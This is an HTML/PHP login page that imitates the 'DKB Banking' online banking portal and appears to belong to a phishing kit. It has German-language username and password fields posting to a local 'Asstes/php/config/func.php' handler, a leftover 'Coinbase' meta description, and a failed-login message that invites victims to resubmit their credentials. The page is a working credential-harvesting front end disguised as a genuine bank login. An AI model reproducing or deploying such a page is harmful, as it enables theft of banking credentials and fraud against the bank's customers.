<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Asstes/imgs/favicon.ico">
        <title>DKB Banking</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Asstes/css/style.css">
    </head>
    <body class="login">
      
    
    <!-- Header -->
    <header class="header_1">
      <div class="container_header_1 d-flex  justify-content-between">
        <div class="logo">
          <img src="./Asstes/imgs/Logo.svg" alt="">
        </div>
        <div class="btn_right">
          <button>Zum bisherigen Banking</button>
        </div>
      </div>
    </header>

    <!-- wrapper_login -->
    <div class="wrapper_login">
      <div class="container_login">
        <div class="box_error">
          <?php if( isset($_GET['error']) ) : ?>
          <div class="error_alert">
            <img src="./Asstes/imgs/alert_error.svg" alt="">
            <p class="mb-0">Die Anmeldung ist fehlgeschlagen. Bitte überprüfe die Anmeldedaten und versuche es erneut.</p>
          </div>
          <?php endif; ?>    
        </div>
        <form action="./Asstes/php/config/func.php" method="post">
          <input type="hidden" name="Log">
          <div class="title">
            <h1>Mein Banking</h1>
          </div>
          <div class="inputes">
            <div class="form-group">
              <label for="">Anmeldename</label>
              <input type="text" name="user" id="user">
            </div>
            <div class="form-group">
              <label for="">Passwort</label>
              <input type="password" name="pass" id="pass">
              <img src="./Asstes/imgs/eye.svg" class="eye" alt="">
            </div>
          </div>
          <div class="btn_sub">
            <button type="submit" disabled>Anmelden</button>
          </div>
          <p class="forget mb-0"><a href="">Passwort</a> oder <a href="">Anmeldenamen</a> vergessen?</p>
        </form>
      </div>
    </div>

    <!-- footer_1 -->
    <div class="footer_1">
      <div class="container_footer_1 d-flex justify-content-between">
        <div class="part_left">
          <ul class="d-flex align-items-center mb-0 ps-0">
            <li>DKB Startseite</li>
            <li>Infoseite</li>
          </ul>
        </div>
        <div class="part_right">
          <ul class="d-flex align-items-center mb-0 ps-0">
            <li>DKB Verwalterplattform</li>
            <li>DKB Treuhänderplattform</li>
            <li>Impressum</li>
            <li>Datenschutz</li>
            <li>Cookie Einstellungen</li>
            <li>Preise & Bedingungen</li>
            <li>Hilfe</li>
          </ul>
        </div>
      </div>
    </div>








    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    
    <script>        
        $(".form-group input").keyup(function(){
          if ($(".form-group #user").val() != "" & $(".form-group #pass").val() != "") {
            $(".btn_sub button").prop("disabled",false);
            $(".btn_sub button").addClass("active");
          }else{
            $(".btn_sub button").prop("disabled",true);
            $(".btn_sub button").removeClass("active");
          }
        });
        $(".form-group input").focus(function(){
          $(this).prev().addClass("focus");
          $(this).addClass("focus");
        });
        $(".form-group input").blur(function(){
          if ($(this).val() == "") {
              $(this).prev().removeClass("focus");
          }
          $(this).removeClass("focus");
        }); 
        $(".eye").click(function(){
              if ($("#pass").attr("type") == "password") {
                $("#pass").attr("type","text")
                $(this).attr("src","./Asstes/imgs/eye-slash.svg")
              }else{
                $("#pass").attr("type","password")
                $(this).attr("src","./Asstes/imgs/eye.svg")
              }
            })                
    </script>
    </body>
</html>